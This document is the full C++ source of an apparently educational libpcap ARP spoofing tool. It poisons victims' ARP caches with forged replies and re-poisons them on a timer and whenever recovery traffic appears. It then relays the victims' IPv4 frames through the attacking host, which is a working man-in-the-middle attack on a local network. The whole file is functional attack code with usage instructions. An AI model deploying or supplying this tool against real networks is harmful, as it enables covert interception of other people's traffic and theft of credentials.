#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <ctime>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include "arphdr.h"
#include "ethhdr.h"

// Ethernet and ARP packet structure with 1-byte alignement
#pragma pack(push, 1)
struct EthArpPacket final 
{
  EthHdr eth_;
  ArpHdr arp_;
};
#pragma pack(pop)

// Maximum bytes to capture per packet (64KB)
static const int kSnapLen = 65536;

// Network flow connect information between sender and target
struct Flow final 
{
  Ip senderIp_;
  Ip targetIp_;
  Mac senderMac_; 
  Mac targetMac_; 
};

// ARP spoofing manager for infection , relaying ,and recovery
class ArpSpoof final 
{
public:
  ~ArpSpoof();

  // Open interface , get my MAC/IP ,and resolve MAC for each flow
  bool init(const char *dev, const std::vector<std::pair<Ip, Ip>> &pairs);

  void run(); // Start initial infection , reinfection thread , and relay/recovery
  void stop() { run_.store(false); }

private:
  void sendArp(Mac ethDmac, Mac ethSmac, uint16_t op, Mac arpSmac, Ip arpSip,
               Mac arpTmac, Ip arpTip);
  Mac resolveMac(Ip ip);
  void infect(const Flow &f);
  void recover(const Flow &f);

  void periodicInfect(); // Main body for the reinfection thread
  void relayLoop();      // Packet relay and recovery detection loop

  static bool getMyMac(const char *dev, Mac &mac);
  static bool getMyIp(const char *dev, Ip &ip);

private:
  pcap_t *rx_ = nullptr; // Handle for packet capture only
  pcap_t *tx_ = nullptr; // Handle for packet transmission only
  std::mutex txMutex_;

  Mac myMac_;
  Ip myIp_;
  std::vector<Flow> flows_;
  std::atomic<bool> run_{true};
};

ArpSpoof::~ArpSpoof()
{
  for (size_t i = 0; i < flows_.size(); i++)
    for (int k = 0; k < 3; ++k)
      recover(flows_[i]);
  // Close pcap handles
  if (rx_ != nullptr)
    pcap_close(rx_);
  if (tx_ != nullptr)
    pcap_close(tx_);
}

// Get the MAC address of the local interface
bool ArpSpoof::getMyMac(const char *dev, Mac &mac) 
{
  int fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0)
    return false;

  struct ifreq ifr;

  memset(&ifr, 0, sizeof(ifr));
  strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

  // Get MAC Address
  bool ok = (ioctl(fd, SIOCGIFHWADDR, &ifr) >= 0);
  close(fd);
  if (!ok)
    return false;
  // Copy the MAC Address (6 bytes )
  mac = Mac(reinterpret_cast<uint8_t *>(ifr.ifr_hwaddr.sa_data));
  return true;
}

// Get the IP address of the local interface
bool ArpSpoof::getMyIp(const char *dev, Ip &ip) 
{
  int fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0)
    return false;

  struct ifreq ifr;

  memset(&ifr, 0, sizeof(ifr));
  strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

  ifr.ifr_addr.sa_family = AF_INET; // set IP family 
  bool ok = (ioctl(fd, SIOCGIFADDR, &ifr) >= 0); // Get IP Address
  close(fd);

  if (!ok)
    return false;
  struct sockaddr_in *sin =
      reinterpret_cast<struct sockaddr_in *>(&ifr.ifr_addr);
  ip = Ip(ntohl(sin->sin_addr.s_addr));// n -> h
  return true;
}

// Craft and send an ARP packet 
void ArpSpoof::sendArp(Mac ethDmac, Mac ethSmac, uint16_t op, Mac arpSmac,
                       Ip arpSip, Mac arpTmac, Ip arpTip) 
{
  EthArpPacket packet;
  packet.eth_.dmac_ = ethDmac;
  packet.eth_.smac_ = ethSmac;
  packet.eth_.type_ = htons(EthHdr::Arp);
  packet.arp_.hrd_ = htons(ArpHdr::ETHER);
  packet.arp_.pro_ = htons(EthHdr::Ip4);
  packet.arp_.hln_ = sizeof(Mac); // MAC length = 6
  packet.arp_.pln_ = sizeof(Ip);  // IP  length = 4
  packet.arp_.op_ = htons(op);
  packet.arp_.smac_ = arpSmac;
  packet.arp_.sip_ = htonl(arpSip);
  packet.arp_.tmac_ = arpTmac;
  packet.arp_.tip_ = htonl(arpTip);

  std::lock_guard<std::mutex> lock(txMutex_); // prevent packet drop
  int res = pcap_sendpacket(tx_, reinterpret_cast<const u_char *>(&packet),
                            sizeof(EthArpPacket));
  if (res != 0)
    fprintf(stderr, "pcap_sendpacket error %d %s\n", res, pcap_geterr(tx_));
}

// Find the MAC address for a specific IP using ARP Requests 
Mac ArpSpoof::resolveMac(Ip ip) 
{
  for (int attempt = 0; attempt < 3; ++attempt) // Max 3 attempts
  { 
    // Broadcast ARP request
    sendArp(Mac::broadcastMac(), myMac_, ArpHdr::Request, myMac_, myIp_,
            Mac::nullMac(), ip);

    time_t start = time(nullptr);
    while (time(nullptr) - start < 2) // 2 seconds wait
    { 
      struct pcap_pkthdr *header;
      const u_char *data;

      int res = pcap_next_ex(rx_, &header, &data); // get packet
      if (res != 1) // if not success
        continue;
      if (header->caplen < sizeof(EthArpPacket)) // check size
        continue;

      auto *p = reinterpret_cast<const EthArpPacket *>(data);
      if (p->eth_.type() != EthHdr::Arp) // check arp type
        continue;
      if (p->arp_.op() != ArpHdr::Reply)
        continue;
      if (p->arp_.sip() != ip)
        continue; // sip() returns host byte order Ip
      if (p->arp_.tip() != myIp_)
        continue;
      return p->arp_.smac_;
    }
  }
  fprintf(stderr, "resolveMac failed for %s\n", std::string(ip).c_str());
  exit(-1);
}

// Poison the sender's ARP cache : senderIp -> myIp = senderMac
void ArpSpoof::infect(const Flow &f) 
{
  sendArp(f.senderMac_, myMac_, ArpHdr::Reply, myMac_, f.targetIp_,
          f.senderMac_, f.senderIp_);
}

// Restore the sender's ARP cache with the genuine target MAC 
void ArpSpoof::recover(const Flow &f) 
{
  sendArp(f.senderMac_, f.targetMac_, ArpHdr::Reply, f.targetMac_, f.targetIp_,
          f.senderMac_, f.senderIp_);
}

// Periodic reinfection thread to keep targets poisoned 
void ArpSpoof::periodicInfect() 
{
  while (run_.load()) 
  {
    for (size_t i = 0; i < flows_.size(); i++)
      infect(flows_[i]);
    for (int i = 0; i < 10 && run_.load(); ++i)
      std::this_thread::sleep_for(std::chrono::milliseconds(100));
  }
}

// Main loop : relay victim's packets to real target + detect ARP recovery
void ArpSpoof::relayLoop()
{
  while (run_.load())
  {
    struct pcap_pkthdr *header;
    const u_char *data;
    int res = pcap_next_ex(rx_, &header, &data); // capture one packet
 
    if (res == 0)                                     // timeout, try again
      continue;
    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) // error, stop
      break;
    if (header->caplen < sizeof(EthHdr))              // too short, skip
      continue;
 
    u_char *frame = const_cast<u_char *>(data);
    EthHdr *eth = reinterpret_cast<EthHdr *>(frame);
 
    // Skip packets I sent myself (prevent infinite loop)
    if (eth->smac_ == myMac_)
      continue;
 
    // --- ARP packet: someone might be trying to fix their cache ---
    if (eth->type() == EthHdr::Arp)
    {
      if (header->caplen < sizeof(EthArpPacket))
        continue;
 
      ArpHdr *arp = reinterpret_cast<ArpHdr *>(frame + sizeof(EthHdr));
      Ip sip = arp->sip(); // who sent this ARP
      Ip tip = arp->tip(); // who is this ARP about
 
      // If this ARP mentions any IP in our flows, re-poison immediately
      for (size_t i = 0; i < flows_.size(); i++)
      {
        bool involved = sip == flows_[i].senderIp_ || tip == flows_[i].senderIp_ ||
                        sip == flows_[i].targetIp_ || tip == flows_[i].targetIp_;
        if (involved)
          infect(flows_[i]);
      }
      continue; // ARP packets are not relayed
    }
 
    // --- IPv4 packet: relay from victim -> me -> real target ---
    if (eth->type() == EthHdr::Ip4)
    {
      if (eth->dmac_ != myMac_) // only if sent to me
        continue;
 
      for (size_t i = 0; i < flows_.size(); i++)
      {
        if (eth->smac_ != flows_[i].senderMac_) // find which victim sent it
          continue;
 
        // Change MACs and forward to real target
        eth->smac_ = myMac_;                 // from: me
        eth->dmac_ = flows_[i].targetMac_;   // to: real target (e.g. gateway)
 
        std::lock_guard<std::mutex> lock(txMutex_);
        int r = pcap_sendpacket(tx_, frame, header->caplen);
        if (r != 0)
          fprintf(stderr, "relay error %s\n", pcap_geterr(tx_));
        break; // found the matching flow, done
      }
    }
  }
}

// Initialize pcap handles , get system network info , and resolve target MACs
bool ArpSpoof::init(const char *dev,
                    const std::vector<std::pair<Ip, Ip>> &pairs) 
{
  char errbuf[PCAP_ERRBUF_SIZE];
  rx_ = pcap_open_live(dev, kSnapLen, 1, 1, errbuf); 

  if (rx_ == nullptr) {
    fprintf(stderr, "pcap_open_live(%s) rx failed(%s)\n", dev, errbuf);
    return false;
  }
  tx_ = pcap_open_live(dev, kSnapLen, 1, 1, errbuf);
  if (tx_ == nullptr) {
    fprintf(stderr, "pcap_open_live(%s) tx failed(%s)\n", dev, errbuf);
    return false;
  }

  if (!getMyMac(dev, myMac_)) {
    fprintf(stderr, "getMyMac failed\n");
    return false;
  }
  if (!getMyIp(dev, myIp_)) {
    fprintf(stderr, "getMyIp failed\n");
    return false;
  }
  printf("[*] my mac = %s, my ip = %s\n", std::string(myMac_).c_str(),
         std::string(myIp_).c_str());

  for (size_t i = 0; i < pairs.size(); ++i) 
  {
    Flow f;
    f.senderIp_ = pairs[i].first;
    f.targetIp_ = pairs[i].second;
    f.senderMac_ = resolveMac(f.senderIp_);
    f.targetMac_ = resolveMac(f.targetIp_);
    flows_.push_back(f);
    printf("[flow %zu] sender %s(%s) <- target %s(%s)\n", i,
           std::string(f.senderIp_).c_str(), std::string(f.senderMac_).c_str(),
           std::string(f.targetIp_).c_str(), std::string(f.targetMac_).c_str());
  }
  return true;
}

// Start the attack main sequence 
void ArpSpoof::run() 
{
  for (size_t i = 0; i < flows_.size(); i++)
    infect(flows_[i]);
  std::thread infector(&ArpSpoof::periodicInfect, this);//re-infects periodically
  relayLoop(); // Start relaying packets and detecting recoveries
  run_.store(false); 
  infector.join(); // wait for the infector thread to finish
}

static ArpSpoof *g_self = nullptr;
static void onSigint(int) 
{
  if (g_self != nullptr)
    g_self->stop();
}

static void usage() 
{
  printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> "
         "[<sender ip 2> <target ip 2> ...]\n");
  printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char *argv[]) 
{
  if (argc < 4 || (argc % 2) != 0) {
    usage();
    return -1;
  }

  std::vector<std::pair<Ip, Ip>> pairs;
  for (int i = 2; i + 1 < argc; i += 2)
    pairs.emplace_back(Ip(std::string(argv[i])), Ip(std::string(argv[i + 1])));

  ArpSpoof app;
  g_self = &app;
  signal(SIGINT, onSigint); // call app.stop() when Ctrl+C is pressed

  if (!app.init(argv[1], pairs))
    return -1;
  app.run();
  return 0;
}